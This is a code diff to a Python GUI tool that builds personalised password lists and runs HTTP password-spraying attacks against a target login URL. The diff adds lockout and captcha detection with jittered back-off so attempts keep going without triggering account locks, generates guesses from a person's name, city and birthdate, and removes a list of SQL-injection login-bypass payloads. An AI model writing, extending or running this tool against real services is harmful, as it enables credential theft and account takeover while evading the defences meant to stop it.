@@ -10,6 +10,7 @@ import itertools
 import re
 from collections import deque
 from datetime import datetime
+from urllib.parse import urlparse
 
 import tkinter as tk
 from tkinter import filedialog
@@ -124,6 +125,12 @@ class PasswordListGeneratorApp:
         self.var_spray_window_min = tk.DoubleVar(value=60.0)
         self.var_spray_attempts_per_window = tk.IntVar(value=1)
         self.var_spray_stop_on_success = tk.BooleanVar(value=True)
+        # Lockout detection
+        self.var_lockout_enabled = tk.BooleanVar(value=True)
+        self.var_lockout_codes = tk.StringVar(value="429,423,403")
+        self.var_lockout_regex = tk.StringVar(value="account locked|too many attempts|temporarily blocked|captcha")
+        self.var_lockout_cooldown_min = tk.DoubleVar(value=30.0)
+        self.var_lockout_jitter = tk.BooleanVar(value=True)
 
         # Build UI
         self._build_ui()
@@ -192,6 +199,12 @@ class PasswordListGeneratorApp:
         self._add_labeled_entry(target, "Proxy URL", self.var_proxy_url, row=5, col=4)
         ttk.Checkbutton(target, text="Verify TLS", variable=self.var_verify_tls).grid(row=5, column=6, sticky="w", padx=4, pady=4)
         self._add_labeled_entry(target, "Timeout (s)", self.var_timeout, row=5, col=7)
+        # Lockout detection controls
+        ttk.Checkbutton(target, text="Enable lockout detection", variable=self.var_lockout_enabled).grid(row=6, column=0, sticky="w", padx=4, pady=4)
+        self._add_labeled_entry(target, "Lockout codes (csv)", self.var_lockout_codes, row=6, col=2)
+        self._add_labeled_entry(target, "Lockout regex", self.var_lockout_regex, row=6, col=4)
+        self._add_labeled_entry(target, "Lockout cooldown (min)", self.var_lockout_cooldown_min, row=6, col=6)
+        ttk.Checkbutton(target, text="Jitter", variable=self.var_lockout_jitter).grid(row=6, column=8, sticky="w", padx=4, pady=4)
         for i in range(0, 9):
             target.grid_columnconfigure(i, weight=1)
 
@@ -207,8 +220,9 @@ class PasswordListGeneratorApp:
         ttk.Checkbutton(users, text="Generate patterns", variable=self.var_generate_patterns).grid(row=1, column=0, sticky="w", padx=4, pady=4)
         ttk.Label(users, text="Email domain").grid(row=1, column=1, sticky="e", padx=4, pady=4)
         ttk.Entry(users, textvariable=self.var_email_domain).grid(row=1, column=2, sticky="we", padx=4, pady=4)
-        ttk.Checkbutton(users, text="Lowercase usernames", variable=self.var_lowercase_usernames).grid(row=1, column=3, sticky="w", padx=4, pady=4)
-        ttk.Checkbutton(users, text="Include common aliases", variable=self.var_common_aliases).grid(row=1, column=4, sticky="w", padx=4, pady=4)
+        ttk.Button(users, text="Use target domain", command=self.on_use_target_domain).grid(row=1, column=3, sticky="w", padx=4, pady=4)
+        ttk.Checkbutton(users, text="Lowercase usernames", variable=self.var_lowercase_usernames).grid(row=1, column=4, sticky="w", padx=4, pady=4)
+        ttk.Checkbutton(users, text="Include common aliases", variable=self.var_common_aliases).grid(row=1, column=5, sticky="w", padx=4, pady=4)
         # Spray controls
         ttk.Checkbutton(users, text="Enable Password Spraying", variable=self.var_spray_enabled).grid(row=2, column=0, sticky="w", padx=4, pady=4)
         ttk.Label(users, text="Passwords file (one per line)").grid(row=2, column=1, sticky="e", padx=4, pady=4)
@@ -431,6 +445,11 @@ class PasswordListGeneratorApp:
                 "spray_cooldown_sec": float(cooldown_min) * 60.0,
                 "spray_stop_on_success": bool(self.var_spray_stop_on_success.get()),
                 "email_domain": self.var_email_domain.get().strip(),
+                "lockout_enabled": bool(self.var_lockout_enabled.get()),
+                "lockout_codes": self._parse_codes(self.var_lockout_codes.get()),
+                "lockout_regex": self._compile_regex(self.var_lockout_regex.get()),
+                "lockout_cooldown_sec": float(self.var_lockout_cooldown_min.get() or 30.0) * 60.0,
+                "lockout_jitter": bool(self.var_lockout_jitter.get()),
             }
 
         mode = self.var_mode.get()
@@ -553,6 +572,12 @@ class PasswordListGeneratorApp:
             "spray_window_min": self.var_spray_window_min.get(),
             "spray_attempts_per_window": self.var_spray_attempts_per_window.get(),
             "spray_stop_on_success": self.var_spray_stop_on_success.get(),
+            # Lockout
+            "lockout_enabled": self.var_lockout_enabled.get(),
+            "lockout_codes": self.var_lockout_codes.get(),
+            "lockout_regex": self.var_lockout_regex.get(),
+            "lockout_cooldown_min": self.var_lockout_cooldown_min.get(),
+            "lockout_jitter": self.var_lockout_jitter.get(),
         }
         path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("Profile JSON", "*.json"), ("All files", "*.*")])
         if not path:
@@ -617,6 +642,8 @@ class PasswordListGeneratorApp:
         if self.var_usernames_file.get():
             self.loaded_usernames = self._parse_list_file(self.var_usernames_file.get())
             self.var_usernames_count.set(f"loaded: {len(self.loaded_usernames)}")
+        else:
+            self.var_usernames_count.set("(none)")
         self.var_email_domain.set(profile.get("email_domain", ""))
         self.var_generate_patterns.set(bool(profile.get("generate_patterns", True)))
         self.var_lowercase_usernames.set(bool(profile.get("lowercase_usernames", True)))
@@ -627,6 +654,12 @@ class PasswordListGeneratorApp:
         self.var_spray_window_min.set(float(profile.get("spray_window_min", 60.0)))
         self.var_spray_attempts_per_window.set(int(profile.get("spray_attempts_per_window", 1)))
         self.var_spray_stop_on_success.set(bool(profile.get("spray_stop_on_success", True)))
+        # lockout
+        self.var_lockout_enabled.set(bool(profile.get("lockout_enabled", True)))
+        self.var_lockout_codes.set(profile.get("lockout_codes", "429,423,403"))
+        self.var_lockout_regex.set(profile.get("lockout_regex", "account locked|too many attempts|temporarily blocked|captcha"))
+        self.var_lockout_cooldown_min.set(float(profile.get("lockout_cooldown_min", 30.0)))
+        self.var_lockout_jitter.set(bool(profile.get("lockout_jitter", True)))
 
         self._info("Profile loaded")
 
@@ -842,6 +875,37 @@ class PasswordListGeneratorApp:
             results.append(c)
         return results
 
+    def _smart_tokens(self) -> list[str]:
+        tokens: list[str] = []
+        base_parts = [self.var_name.get(), self.var_surname.get(), self.var_city.get(), self.var_birthdate.get()]
+        for part in base_parts:
+            part = (part or "").strip()
+            if not part:
+                continue
+            for t in filter(None, itertools.chain.from_iterable([p.split(sep) for sep in [" ", "-", "_", ".", ",", "/"] for p in [part]])):
+                tokens.append(t)
+                if t.isdigit() and 2 <= len(t) <= 4:
+                    tokens.append(t)
+        wordlist_path = os.path.join(os.getcwd(), "wordlist.txt")
+        if os.path.exists(wordlist_path):
+            try:
+                with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as wf:
+                    for i, line in enumerate(wf):
+                        if i >= 1000:
+                            break
+                        w = line.strip()
+                        if w:
+                            tokens.append(w)
+            except Exception:
+                pass
+        seen = set()
+        deduped = []
+        for t in tokens:
+            if t not in seen:
+                seen.add(t)
+                deduped.append(t)
+        return deduped[:2000]
+
     def _mutate_cases_and_leet(self, token: str) -> list[str]:
         variants = set()
         if not token:
@@ -1021,17 +1085,20 @@ class PasswordListGeneratorApp:
             return bool(succ_re.search(text))
         return status_ok
 
-    def _sqli_payloads(self) -> list[str]:
-        return [
-            "' OR '1'='1",
-            '" OR "1"="1',
-            "' OR 1=1 -- ",
-            "' OR '1'='1' -- ",
-            "admin'--",
-            "' OR 'x'='x",
-            "') OR ('1'='1",
-            "' OR 1=1#",
-        ]
+    def _is_lockout(self, resp, cfg: dict) -> bool:
+        if resp is None or not cfg.get('lockout_enabled'):
+            return False
+        if resp.status_code in (cfg.get('lockout_codes') or set()):
+            return True
+        lock_re = cfg.get('lockout_regex')
+        if lock_re:
+            try:
+                text = resp.text or ""
+            except Exception:
+                text = ""
+            if lock_re.search(text):
+                return True
+        return False
 
     def _configure_session(self, sess: requests.Session, cfg: dict) -> None:
         try:
@@ -1091,6 +1158,34 @@ class PasswordListGeneratorApp:
             except Exception:
                 pass
 
+        # Shared lockout state
+        lockout_lock = threading.Lock()
+        lockout_until = [0.0]  # mutable box
+
+        def wait_if_locked():
+            while True:
+                if self.cancel_requested:
+                    return
+                with lockout_lock:
+                    t = lockout_until[0]
+                now = time.time()
+                if now >= t:
+                    return
+                # sleep a bit until lockout expires
+                time.sleep(0.2)
+
+        def trigger_lockout_backoff():
+            with lockout_lock:
+                base = float(cfg.get('lockout_cooldown_sec', 0.0))
+                if cfg.get('lockout_jitter'):
+                    # +/- 15% jitter
+                    jitter = base * 0.15
+                    delay = max(1.0, base + (jitter * (2.0 * (time.time() % 1.0) - 0.5)))
+                else:
+                    delay = max(1.0, base)
+                lockout_until[0] = max(lockout_until[0], time.time() + delay)
+            self.ui_queue.put(("log", f"[Lockout] Detected; backing off for ~{int(delay)}s"))
+
         def run_batch(pair_iterable) -> bool:
             # returns True if success found and stop
             nonlocal completed, found_msg
@@ -1131,8 +1226,14 @@ class PasswordListGeneratorApp:
                         if user is None:
                             break
                         try:
+                            wait_if_locked()
+                            if self.cancel_requested or stop_event.is_set():
+                                break
                             limiter.acquire()
                             resp = self._http_attempt(sess, cfg, user, pwd)
+                            # Lockout detection
+                            if self._is_lockout(resp, cfg):
+                                trigger_lockout_backoff()
                             with progress_lock:
                                 completed += 1
                                 if completed % 100 == 0:
@@ -1229,6 +1330,25 @@ class PasswordListGeneratorApp:
         if not path:
             return
         self.var_spray_passwords_file.set(path)
+
+    def on_use_target_domain(self) -> None:
+        url = self.var_target_url.get().strip()
+        if not url:
+            return
+        try:
+            host = urlparse(url).hostname or ""
+            parts = host.split('.') if host else []
+            public_suffix_2 = {"co.uk", "com.au", "co.jp", "com.br", "com.tr", "com.mx", "com.ar", "com.sg"}
+            domain = ""
+            if len(parts) >= 2:
+                last_two = ".".join(parts[-2:])
+                if last_two in public_suffix_2 and len(parts) >= 3:
+                    domain = ".".join(parts[-3:])
+                else:
+                    domain = last_two
+            self.var_email_domain.set(domain)
+        except Exception:
+            pass
 
     def run(self) -> None:
         try:
